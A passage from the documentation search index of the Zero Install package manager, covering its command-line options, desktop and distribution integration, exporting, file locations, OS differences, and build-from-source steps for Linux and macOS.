remove-dir","text":"<p>Removes a directory from the list of custom implementation caches.</p> <p>Usage: <code>0install store remove-dir PATH</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user."},{"location":"details/cli/#central","title":"central","text":"<p>Opens the central graphical user interface for launching and managing applications.</p> <p>Usage: <code>0install central [OPTIONS]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user."},{"location":"details/cli/#add","title":"add","text":"<p>Add an application to the application list.</p> Usage Linux: <code>0install add [OPTIONS] NAME URI</code> Usage Windows: <code>0install add [OPTIONS] [NAME] URI</code> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user. <code>--no-download</code>(Windows only) Do not download the application itself yet. Will be automatically downloaded on first use instead."},{"location":"details/cli/#remove","title":"remove","text":"<p>Removes an application from the application list and undoes any desktop environment integration.</p> <p>Usage: <code>0install remove [OPTIONS] (ALIAS|INTERFACE)</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user."},{"location":"details/cli/#remove-all","title":"remove-all","text":"<p>Removes all applications from the application list and undoes any desktop environment integration. Use this command to clean up the system before removing Zero Install.</p> <p>Usage: <code>0install remove-all [OPTIONS]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user."},{"location":"details/cli/#integrate","title":"integrate","text":"<p>Adds an application to the application list (if missing) and integrate it into the desktop environment.</p> <p>Usage: <code>0install integrate [OPTIONS] (ALIAS|INTERFACE)</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user. <code>--no-download</code>(Windows only) Do not download the application itself yet. Will be automatically downloaded on first use instead. <code>--add-standard</code> Add the recommended standard access points. <code>--add-all</code> Add all available access points. <code>--add <code>CATEGORY</code></code> Add all access points of a specific <code>CATEGORY</code>. Supported values: <code>capability-registration</code>, <code>menu-entry</code>, <code>desktop-icon</code>, <code>send-to</code>, <code>alias</code>, <code>auto-start</code>, <code>default-access-point</code> <code>--remove-all</code> Remove all access points. <code>--remove <code>CATEGORY</code></code> Remove all access points of a specific <code>CATEGORY</code>. Supported values: <code>capability-registration</code>, <code>menu-entry</code>, <code>desktop-icon</code>, <code>send-to</code>, <code>alias</code>, <code>auto-start</code>, <code>default-access-point</code>"},{"location":"details/cli/#alias","title":"alias","text":"<p>Create an alias for launching an application via 0install without always having to enter the full URI.</p> <p>Usage: <code>0install alias ALIAS [INTERFACE [COMMAND]]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user. <code>--no-download</code>(Windows only) Do not download the application itself yet. Will be automatically downloaded on first use instead. <code>--resolve</code> Print the interface URI for the given alias. <code>--remove</code> Remove an existing alias."},{"location":"details/cli/#list-apps","title":"list-apps","text":"<p>Lists all applications currently in your application list. If an <code>URI</code> is given, only the application with that feed URI is shown. If a <code>PATTERN</code> is given, only applications containing that string in their name are shown (case insensitive).</p> <p>Usage: <code>0install list-apps [URI|PATTERN]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user. <code>--xml</code> Write output to console as machine-readable XML."},{"location":"details/cli/#update-all","title":"update-all","text":"<p>Updates all applications in the application list.</p> <p>Usage: <code>0install update-all [OPTIONS]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user. <code>-c</code><code>--clean</code> Remove implementations no longer required after the update."},{"location":"details/cli/#repair-all","title":"repair-all","text":"<p>Reapplies all desktop integrations of applications in the application list.</p> <p>Usage: <code>0install repair-all [OPTIONS]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user."},{"location":"details/cli/#sync","title":"sync","text":"<p>Synchronizes the application list with the server.</p> <p>Usage: <code>0install sync [OPTIONS]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user. <code>--reset <code>MODE</code></code> Reset the synchronization data. Supported values: <code>none</code> (merge data from client and server normally), <code>client</code> (replace all data on client with data from server) and <code>server</code> (replace all data on server with data from client)."},{"location":"details/cli/#import-apps","title":"import-apps","text":"<p>Imports a set of applications and desktop integrations from an existing app-list.xml file.</p> <p>Usage: <code>0install import-apps APP-LIST-FILE [OPTIONS]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user. <code>--no-download</code>(Windows only) Do not download the application itself yet. Will be automatically downloaded on first use instead."},{"location":"details/cli/#self-deploy","title":"self deploy","text":"<p>Deploys Zero Install to the specified <code>TARGET</code> directory or the default directory for programs and integrates it in the system.</p> <p>Usage: <code>0install self deploy [TARGET]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>-m</code><code>--machine</code>(Windows only) Apply the configuration machine-wide (for the entire computer) instead of just for the current user. <code>-p</code><code>--portable</code> Create a portable installation that can be moved around (e.g., on a thumb drive). <code>--restart-central</code> Restart the <code>0install central</code> GUI after the update."},{"location":"details/cli/#self-remove","title":"self remove","text":"<p>Removes the current instance of Zero Install from the system.</p> <p>Usage: <code>0install self remove</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output."},{"location":"details/cli/#self-update","title":"self update","text":"<p>Updates Zero Install itself to the most recent version.</p> <p>Usage: <code>0install self update [OPTIONS]</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>--with-store <code>DIR</code></code> Add <code>DIR</code> to the list of implementation caches to search. However, new downloads will not be written to this directory. <code>--before <code>VERSION</code></code> Require a version of the main program earlier than <code>VERSION</code>. i.e., force the use of an old version the program. <code>--not-before <code>VERSION</code></code> Require a version of the main program not earlier than <code>VERSION</code>. E.g., if you want to run version 2.0 or later, use <code>--not-before=2.0</code>. <code>--version <code>RANGE</code></code> Require a version of the main program within the given <code>RANGE</code>. Ranges are separated by pipes (<code>|</code>). Each range is in the form <code>START..!END</code>. The range matches versions where <code>START</code> &lt;= <code>VERSION</code> &lt; <code>END</code>. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or <code>!VERSION</code> to match everything except that version. <code>--version-for <code>URI</code> <code>RANGE</code></code> For any library or sub-component with the given <code>URI</code> specifies the version <code>RANGE</code> (as for <code>--version</code>). <code>--language</code> Specifies the preferred language for the implementation. Use ISO short language codes (e.g. <code>en</code> or <code>en-US</code>). You can use this option multiple times to specify multiple acceptable languages. <code>--force</code> Perform the update even if the currently installed version is the same or newer. <code>--restart-central</code> Restart the <code>0install central</code> GUI after the update."},{"location":"details/desktop-integration/","title":"Desktop integration","text":"<p>Note</p> <p>This is currently only supported in Zero Install for Windows.</p> <p>Zero Install allows you to integrate applications into your desktop environment as you are accustomed to from classic setup programs: Start menu entries, file type associations, entries in context menus, etc.. All the advantages of Zero Install such as automatic updates, parallel usage of multiple application versions and easy application removal are preserved.</p>"},{"location":"details/desktop-integration/#basics","title":"Basics","text":"<p>Open Zero Install and search for an app in the Catalog. Click on the  button to add it to \"My Apps\". Then click on Integrate in the pop-up box to add it to the start menu.</p> <p></p> <p>Tip</p> <p>Zero Install Sync allows you to synchronize your application list and desktop integration between multiple computers.</p>"},{"location":"details/desktop-integration/#advanced","title":"Advanced","text":"<p>By clicking on Advanced settings, you can control exactly how Zero Install integrates an application: which shortcuts to create, which file types to associate, etc.</p> <p></p> <p>You can perform desktop integration from the command-line as well. For example, to add VLC to your start menu and add register its supported file types:</p> <pre><code>0install integrate --add-standard https://apps.0install.net/gui/vlc.xml\n</code></pre> <p>See the command-line documentation for details.</p>"},{"location":"details/desktop-integration/#machine-wide","title":"Machine-wide","text":"<p>Zero Install's desktop integration is usually applied on a per-user basis. If you wish to \"install\" an application for all users on a machine you can switch to machine-wide mode. Start menu entries, desktop icons, file associations, etc. are then applied to their respective machine-wide locations.</p> <p>Even though the desktop integration is then shared by all users the actual solving and downloading of implementations is still done by individual users. This allows applications to be updated without administrative intervention and enables users to specify their own version overrides for applications. To prevent unnecessary duplication of application files use the Store Service to share an implementation cache between all users.</p> <p>Machine-wide mode can be used by adding the <code>--machine</code> option to one of the following commands: <code>0install add</code>, <code>0install integrate</code>, <code>0install remove</code>, <code>0install sync</code></p> <p>You can also run <code>0install central --machine</code> to use the normal GUI to manage machine-wide desktop integration.</p>"},{"location":"details/distribution-integration/","title":"Distribution integration","text":"<p>Supported distributions:</p> <ul> <li><code>Arch</code>: Arch Linux - since 1.6</li> <li><code>Cygwin</code>: Cygwin - since 1.7</li> <li><code>Darwin</code>: (detects native Java) - since 1.11</li> <li><code>Debian</code>: dpkg-based (Debian, Mint, Ubuntu, etc) - since 0.28</li> <li><code>Gentoo</code>: Gentoo - since 0.45</li> <li><code>MacPorts</code>: Mac OS X (ports) - since 1.4 (also extends \"Darwin\")</li> <li><code>Ports</code>: FreeBSD - since 0.47</li> <li><code>RPM</code>: RPM-based (Red Hat, Fedora, OpenSUSE, etc) - since 0.31</li> <li><code>Slack</code>: Slackware - since 0.48</li> <li><code>Windows</code>: Windows (detects native Java, .NET Framework, .NET, PowerShell and Git) - in Windows version</li> </ul> <p>If you have already installed a package using your distribution's installer then Zero install can use that instead of downloading a second copy using Zero Install. It can also use PackageKit to install them, if the user is authorised.</p> <p>For example, here is what happens if you ask to run AbiWord when you already have the <code>libenchant1</code> library it requires installed using <code>apt-get</code>:</p> <pre><code>0install run http://0install.net/2006/autopackage/Abiword.xml\n</code></pre> <p></p> <p>If Abiword is itself installed as a distribution package, then the dialog is even simpler, and nothing needs to be downloaded:</p> <p></p> <p>Of course, you are always free to change the selected version from the native package to a Zero Install version. This will also happen automatically if your native version is incompatible with the required version. For example, if you try this on a machine with a very old copy of <code>libenchant1</code> then Zero Install will download a newer version rather than using that one.</p> <p>All software installed by Zero Install goes in the cache directory and does not conflict with files installed by the native package manager. If PackageKit is used instead, the user is prompted to confirm, since installing distribution packages can affect the system as a whole. Note that PackageKit can only be used to install packages from the distribution's repository.</p>"},{"location":"details/distribution-integration/#how-it-works","title":"How it works","text":"<p>Two methods are available to integrate Zero Install packages with distribution ones:</p> <ul> <li> <p>A feed author can add a <code>&lt;package-implementation package=\"name\"/&gt;</code> element to their feed. Zero Install will query your distribution's package manager to see if a package with this name is already installed. If so, that version will be considered as another candidate, with a stability rating of \"packaged\" (which is ranked between \"stable\" and \"preferred\").</p> <p>Since different distributions use different names for the same package, you can specify which distribution(s) an element applies to like this (some RPM-based distributions use <code>pkgconfig</code>, while other RPM systems use <code>pkg-config</code>, which is also the name used by Debian):</p> </li> </ul> <pre><code>  &lt;package-implementation distributions=\"RPM\" package=\"pkgconfig\"/&gt;\n  &lt;package-implementation distributions=\"RPM Debian\" package=\"pkg-config\"/&gt;\n  &lt;package-implementation distributions=\"Gentoo\" package=\"dev-util/pkgconfig\"/&gt;\n</code></pre> <ul> <li> <p>A distribution package can install a file named <code>/usr/share/0install.net/native_feeds/INTERFACE</code>. This is automatically used as an additional feed for <code>INTERFACE</code> (replace <code>/</code> characters in the package's interface URI with <code>#</code> characters).</p> <p>This is useful if the package installs the program as a self-contained directory somewhere. i.e. the installed package has the same format as the Zero Install package. If the package already contains a local feed file, you can just symlink to it directly.</p> </li> </ul>"},{"location":"details/export/","title":"Export","text":"<p>Zero Install automatically takes care of downloading applications and their dependencies when you run them on your computer. However, it is sometimes useful to download everything required to run an application and export it, e.g., for use on machine without an internet connection, or where the connection is very slow.</p> WindowsLinux / macOS <p>You can use the command <code>0install export</code> to generate a directory with archives holding all required implementations and a small Bootstrapper executable for importing them and setting up Zero Install on systems that don't have it yet.</p> <p>Example</p> <pre><code>0install export --include-zero-install https://apps.0install.net/gui/vlc.xml somedir\n</code></pre> <p>The resulting directory structure would look like this:</p> <pre><code>somedir\n \u251c\u2500 import.cmd\n \u2502 Script for importing the content on a machine that already has 0install.\n \u2502\n \u251c\u2500 run VLC media player.exe\n \u2502 Version of the bootstapper pre-configured for importing the content and then running VLC.\n \u2502 Also works on a machine that does not have 0install set up yet.\n \u2502\n \u2514\u2500 content\n     \u251c\u2500 https%3a##apps.0install.net##gui#vlc.xml\n     \u251c\u2500 https%3a##apps.0install.net#0install#0install-win.xml\n     \u251c\u2500 https%3a##apps.0install.net#dotnet#framework.xml\n     \u2502 The downloaded feeds.\n     \u2502\n     \u251c\u2500 22EA111A7E4242A4.gpg\n     \u251c\u2500 85A0F0DAB46EE668.gpg\n     \u2502 GnuPG keys used to sign the feeds.\n     \u2502\n     \u251c\u2500 sha256new_K44G7XQ4SOWRHVVFSXDW737RFQAKICZE6MAX35OJ7DJHABZKSLVQ.tbz2\n     \u2514\u2500 sha256new_Z7MMJYZMBDNZMQKRUNOA3IEWGB7AXITJWCLK7RRXFIQ2EVBUX5JQ.tbz2\n      Implementations selected for VLC and Zero Install compressed as archives named by digest.\n</code></pre> <p>You can also export individual implementations from the cache using the command <code>0install store export</code>.</p> <p>Example</p> <pre><code>0install store export sha256new_K44G7XQ4SOWRHVVFSXDW737RFQAKICZE6MAX35OJ7DJHABZKSLVQ vlc-win64-3.0.6.tbz2\n</code></pre> <p>You can use the tool 0export to create self-installing bundles.</p>"},{"location":"details/file-locations/","title":"File locations","text":"<p>This page documents the filesystem paths Zero Install reads from and writes to during normal operation.</p> <p>Hint</p> <p>On Windows you can use Portable mode to store all files in a single directory (e.g., for use on a USB thumb drive).</p> <p>Note</p> <p>On Linux Zero Install follows the XDG Base Directory Specification.</p> Linux, MacOS Windows General settings <code>~/.config/0install.net/injector</code> <code>%APPDATA%\\0install.net\\injector</code> <code>/etc/xdg/0install.net/injector</code> <code>%PROGRAMDATA%\\0install.net\\injector</code> Interface-specific settings <code>~/.config/0install.net/injector/interfaces</code> <code>%APPDATA%\\0install.net\\injector\\interfaces</code> Feed-specific settings <code>~/.config/0install.net/injector/feeds</code> <code>%APPDATA%\\0install.net\\injector\\feeds</code> Feed cache <code>~/.cache/0install.net/interfaces</code> <code>%LOCALAPPDATA%\\0install.net\\interfaces</code> Implementation cache <code>~/.cache/0install.net/implementations</code> <code>%LOCALAPPDATA%\\0install.net\\implementations</code> Custom dirs specified in <code>~/.config/0install.net/injector/implementation-dirs</code> Custom dirs specified in <code>%APPDATA%\\0install.net\\injector\\implementation-dirs</code> <code>/var/cache/0install.net/implementations</code> <code>%PROGRAMDATA%\\0install.net\\implementations</code> 0install apps <code>~/.config/0install.net/apps</code> - Icon cache - <code>%LOCALAPPDATA%\\0install.net\\icons</code> Desktop integration - <code>%APPDATA%\\0install.net\\desktop-integration</code> - <code>%PROGRAMDATA%\\0install.net\\desktop-integration</code> Log files - <code>%TEMP%\\0install %USERNAME% Log.txt</code> - <code>%TEMP%\\0install-win %USERNAME% Log.txt</code>"},{"location":"details/linux/","title":"Zero Install for Linux","text":"<p>The Linux version and Windows version of Zero Install share the same feed format. For most common use-cases they behave identically on the command-line. There are however some OS-specific differences.</p>"},{"location":"details/linux/#generic-binaries","title":"Generic binaries","text":"<p>You can download download various distribution-specific packages as well as generic binaries here.</p> <p>Once you have downloaded an archive with pre-compiled binaries, unpack it and <code>cd</code> into the newly created directory.</p> <p>To install for all users on the system (with root access):</p> <pre><code>$ sudo ./install.sh local\n</code></pre> <p>To install only for the current user (without root access):</p> <pre><code>$ ./install.sh home\n$ export PATH=$HOME/bin:$PATH\n</code></pre> <p>You can also just run <code>./files/0install</code> directly, but  some features won't work unless <code>0install</code> is in <code>PATH</code>.</p>"},{"location":"details/linux/#from-source","title":"From source","text":"<p>You can download the 0install source code for released versions from the GitHub Releases page.</p> <p>Alternatively you can get the latest development version using Git:</p> <pre><code>git clone https://github.com/0install/0install.git\n</code></pre> <p>To install for all users on the system (with root access):</p> <pre><code>$ make\n$ sudo make install\n</code></pre> <p>To install only for the current user (without root access):</p> <pre><code>$ make &amp;&amp; make install_home\n$ export PATH=$HOME/bin:$PATH\n</code></pre>"},{"location":"details/macos/","title":"Zero Install for macOS","text":"<p>The Linux version and macOS version of Zero Install share the same source code but the installation works slightly differently.</p>"},{"location":"details/macos/#installation","title":"Installation","text":"<p>The easiest way of installing Zero Install and its requirements is by using a package manager, to handle building both it and the dependencies for you. </p> <p>You can download a package for macOS here.</p>"},{"location":"details/macos/#from-source","title":"From source","text":"<p>Install the Developer Tools, if needed:</p> <pre><code>$ xcode-select --install\n</code></pre> <p>Install homebrew using git, if needed:</p> <pre><code>$ git clone https://github.com/Homebrew/homebrew.git\n$ export PATH=$PWD/homebrew/bin:$PWD/homebrew/sbin:$PATH\n</code></pre> <p>Install build dependencies:</p> <pre><code>$ brew install pkg-config\n$ brew install gettext\n</code></pre> <p>Install GnuPG (used by 0install to check the digital signatures):</p> <pre><code>$ brew install gnupg\nor\n$ brew install gnupg2\n</code></pre> <p>Optionally, install gtk+ (2.12 or later needed for GUI).:</p> <pre><code>$ brew install gtk+\n$ brew install gtk-engines            ## for the \"Clearlooks\" theme\n</code></pre> <p>Fix homebrew shortcomings:</p> <pre><code>  ## the gettext-tools are not linked with homebrew:\n$ export PATH=\"`brew --prefix gettext`/bin:$PATH\"\n  ## the libpng library is not found by homebrew:\n$ export PKG_CONFIG_PATH=\"`brew --prefix libpng`/lib/pkgconfig:$PKG_CONFIG_PATH\"\n</code></pre> <p>Use the Clearlooks theme:</p> <pre><code>$ export GTK2_RC_FILES=\"`brew --prefix`/share/themes/Clearlooks/gtk-2.0/gtkrc\"\n$ export GTK_PATH=\"`brew --prefix`/lib/lib/gtk-2.0\"\n</code></pre> <p>Install OCaml and OPAM:</p> <pre><code>$ brew install ocaml\n$ brew install opam                   ## OS X Mavericks or later\nor\n$ brew install opam --without-aspcud  ## OS X Mountain Lion or lower\n</code></pre> <p>Initialize the OPAM root, if needed:</p> <pre><code>$ export OPAMROOT=$PWD/opamroot\n$ opam init\n</code></pre> <p>Install OPAM packages:</p> <pre><code>$ eval `opam config env`\n$ opam install yojson xmlm ounit react lwt extlib ocurl sha\n  ## optional, for GUI\n$ opam install lablgtk\n</code></pre> <p>Finally, install 0install itself.</p> <pre><code>$ git clone https://github.com/0install/0install.git\n$ cd 0install\n$ make &amp;&amp; make install_home\n$ export PATH=$HOME/bin:$PATH\n</code></pre>"},{"location":"details/os-differences/","title":"OS-specific differences","text":"<p>The Linux version and Windows version of Zero Install share the same feed format. For most common use-cases they behave identically on the command-line. There are however some OS-specific differences.</p>"},{"location":"details/os-differences/#version-number","title":"Version number","text":"<p>The version numbers of the Linux and Windows versions of Zero Install are loosely coupled. If the first two components of the version number are the same (e.g. 2.1 and 2.1.3) they generally support the same features.</p>"},{"location":"details/os-differences/#command-line-interface","title":"Command-line interface","text":"<p>The command-line interface of the Linux and Windows versions are largely identical, with the following exceptions:</p> <code>0install add|destroy|show|whatchanged</code> These app commands are only available in the Linux version so far. <code>0install man</code> This man-page integration command is only available in the Linux version. <code>0install catalog search|refresh|add|remove|reset|list</code> These catalog commands are only available in the Windows version so far. <code>0install add|remove|alias|integrate|update-all|repair-apps|sync</code> These desktop integration commands are only available in the Windows version so far. <code>0install store list-implementations|purge</code> These cache management commands are only available in the Windows version so far. <code>0install export</code> and <code>0install store export</code> These implementation exporting commands are only available in the Windows version so far. <code>0install self deploy|remove|update</code> These maintenance commands are only available in the Windows version. <code>0install run --no-wait</code> On *nix systems Zero Install replaces itself with the application it launches using <code>exec()</code>. Since there is no direct <code>exec()</code> equivalent on Windows Zero Install launches a child process and waits for it to exit. This Windows-only command-line argument causes Zero Install to return immediately instead without waiting for the child to exit. <code>0install --dry-run</code> Not implemented in the Windows version. <code>0install --console|gui</code> These command-line arguments are not available in the Windows version. Instead it uses separate executables, <code>0install</code> and <code>0install-win</code>, to select console or GUI mode. <code>0install --background|batch</code> These command-line arguments are only available in the Windows version. <code>0install select|download|run --customize</code> This command-line argument is only available in the Windows version."},{"location":"details/os-differences/#configuration-files-and-caches","title":"Configuration files and caches","text":"<p>The Linux and Windows versions mostly use the same formats for configuration files and caches. However, due to some limitations of the Windows filesystem they are not directly interchangeable.</p> <p><code>~/.config/0install.net/injector/interfaces</code> on Linux contains file names with colons in them. In the Windows counterpart <code>%appdata%\\0install.net\\injector\\interfaces</code> these are encoded as <code>%3a</code>.</p> <p>When extracting implementations Zero Install preserves executable-bits and symlinks and considers them when calculating manifest digests. Windows does not have a concept of executable bits. Instead, Zero Install for Windows stores this information in a file called <code>.xbit</code> in the top-level directory of each implementation. On Windows Administrator privileges are required to create symlinks. Therefore Zero Install creates Cygwin-style symlinks instead of \"real\" NTFS symlinks.</p> <p>See also: File locations</p>"},{"location":"details/os-differences/#other-differences","title":"Other differences","text":"<p>The Windows version:</p> <ul> <li>uses NTFS ACLs instead of POSIX octets to make implementation directories read-only.</li> <li>provides in-process extraction code for all supported archive formats, since there is usually no <code>tar</code>, <code>unzip</code>, etc. in the <code>PATH</code> on Windows systems</li> <li>transparently handles Unix-style <code>$ENVIRONMENT_VARIABLES</code> rather than expecting them in the platform-specific <code>%WINDOWS%</code> style.</li> <li>creates binaries instead of shell scripts for command-line aliases and <code>&lt;executable-in-*&gt;</code> bindings.</li> </ul>"},{"location":"details/os-differences/#cross-platform-use","title":"Cross-platform use","text":"<p>The Windows version of Zero Install is written in in C#. It is primarily intended to be be used on Windows NT-based operating systems. However, the Zero Install .NET API it is based on is written with cross-platform support in mind and works on Linux using .NET Core.</p> <p>The Linux version of Zero Install is writtin in OCaml. It is primarily intended to be be used on Unixoid operating systems such as Linux and OS X. It can also be compiled for Windows, however, it lacks a number of Windows-specific features such as support for NTFS ACLs.</p> <p>The Windows version of Zero Install internally uses parts of the Linux version via the JSON API.</p>"},{"location":"details/os-differences/#feature-comparison","title":"Feature comparison","text":"Windows Version Linux Version Feed format  Full support  Full support Shared cache  Yes (using Windows service)  Yes (using store helper) Native package manager integration  No  Yes Apps with cached selection  No  Yes Catalog (recommended feeds and short names)  Yes  No Desktop integration (menu entries, file type associations, etc.)  Yes  Limited App list synchronization  Yes  No Portable mode  Yes  No Runs on Windows  Yes  Limited Runs on Linux  Limited  Yes Runs on macOS  Limited  Yes"},{"location":"details/policy-settings/","title":"Policy settings","text":"<p>You can change policy settings to affect when 0install looks for updates and which versions it prefers.</p> <p>The first part shows how to set policy settings that apply to all applications of the current user. The last section shows how to change per-application settings. Policy affects which versions 0install chooses (do you want test versions, ...).</p>"},{"location":"details/policy-settings/#general-policy-settings","title":"General policy settings","text":"LinuxWindows <p>You can change the policy settings using the Preferences dialog.</p> <p>To open it run <code>0install config</code> or choose Zero Install -&gt; Manage Applications 